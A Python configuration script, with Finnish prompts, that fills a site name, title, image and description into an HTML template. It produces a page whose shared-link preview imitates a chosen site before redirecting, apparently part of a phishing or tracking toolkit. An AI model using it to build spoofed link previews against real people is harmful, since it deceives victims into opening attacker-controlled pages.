#!/usr/bin/env python3

import os
import utils

R = '\033[31m' # punainen
G = '\033[32m' # vihreä
C = '\033[36m' # syväsininen
W = '\033[0m'  # valkoinen

redirect = os.getenv('REDIRECT')
sitename = os.getenv('SITENAME')
title = os.getenv('TITLE')
imageUrl = os.getenv('IMAGE')
desc = os.getenv("DESC")

old = 'n'
if not redirect and not sitename and not title and not imageUrl and not desc:
    old = input(G + '[+]' + C + ' Haluatko käyttää aiempia asetuksia? (Y/N) : ' + W)

if old.lower() != 'y':
    if redirect is None:
        redirect = input(G + '[+]' + C + ' Syötä kohde-URL (YouTube, Blogi jne.) : ' + W)
    else:
        utils.print(f'{G}[+] {C}Kohde-URL :{W} ' + redirect)
    
    if sitename is None:
        sitename = input(G + '[+]' + C + ' Sivuston nimi: ' + W)
    else:
        utils.print(f'{G}[+] {C}Sivuston nimi :{W} ' + sitename)
    
    if title is None:
        title = input(G + '[+]' + C + ' Otsikko : ' + W)
    else:
        utils.print(f'{G}[+] {C}Otsikko :{W} ' + title)
    
    if imageUrl is None:
        imageUrl = input(G + '[+]' + C + ' Kuvan URL : ' + W)
    else:
        utils.print(f'{G}[+] {C}Kuva :{W} ' + imageUrl)
    
    if desc is None:
        desc = input(G + '[+]' + C + ' Kuvaus: ' + W)
    else:
        utils.print(f'{G}[+] {C}Kuvaus :{W} ' + desc)

    with open('template/custom_og_tags/index_temp.html', 'r') as index_temp:
        code = index_temp.read()
        if os.getenv("DEBUG_HTTP"):
            code = code.replace('window.location = "https:" + restOfUrl;', '')
        code = code.replace('$SITE_NAME$', sitename)
        code = code.replace('REDIRECT_URL', redirect)
        code = code.replace('$TITLE$', title)
        code = code.replace('$IMG_URL$', imageUrl)
        code = code.replace('$DESCRIPTION$', desc)

    with open('template/custom_og_tags/index.html', 'w') as new_index:
        new_index.write(code)
